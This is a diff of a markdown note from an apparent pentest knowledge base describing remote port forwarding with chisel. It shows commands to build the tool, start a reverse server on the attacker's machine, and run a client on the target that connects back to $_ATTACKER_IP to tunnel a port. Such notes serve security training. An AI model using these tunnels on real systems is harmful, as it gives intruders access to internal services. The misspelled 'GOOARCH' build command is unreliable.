@@ -36,21 +36,45 @@ Remote port forwarding is a technique which allows a system to forward the traff
 
 Remote port forwarding is a technique which allows a system to forward the traffic of a local port to a remote system, allowing the remote system to connect as if it was a local connection. Often this is done when a service listens only the loopback address (127.0.0.1), and by forwarding it to a remote host, attackers can access the service from a remote system the loopback restriction.
 
+
+
 # Instructions
 
 1. Clone the chisel repository
 
+
+
+
+
 **Code**: [[git clone https://github.com/jpillora/chisel.git]]
+
+
 
 2. Enter the chisel directory, then build the software
 
+
+
+
+
 **Code**: [[cd chisel && go build]]
+
+
 
 3. (Optional) Use the "GOOS" and "GOARCH" variables if building chisel for other platforms. A full list of available OS and ARCH can be found [here](https://golang.org/doc/install/source).
 
+
+
+
+
 **Code**: [[GOOS=windows GOOARCH=amd64 go build]]
 
+
+
 4. 4. Launch the chisel server on the attacker's machine
+
+
+
+
 
 **Command** ([[Chisel Deploy a Reverse Port Forwarding Server]]):
 
@@ -58,7 +82,15 @@ Remote port forwarding is a technique which allows a system to forward the traff
 chisel server -p $_LISTEN_PORT --reverse
 ```
 
+
+
+
+
 5. Launch the chisel client on the target machine
+
+
+
+
 
 **Command** ([[./chisel client $_ATTACKER_IP:$_ATTACKER_PORT R:$_]]):
 
@@ -66,7 +98,11 @@ chisel server -p $_LISTEN_PORT --reverse
 ./chisel client $_ATTACKER_IP:$_ATTACKER_PORT R:$_DESTINATION_PORT:$_SOURCE_PORT
 ```
 
+
+
 Once connected, connections made on the local machine to the forwarded port will be sent over the HTTP proxy to the target host.
+
+
 
 ## Platforms
 
@@ -93,3 +129,5 @@ Once connected, connections made on the local machine to the forwarded port will
 
 - [[data encryption]]
 - [[Network]]
+
+
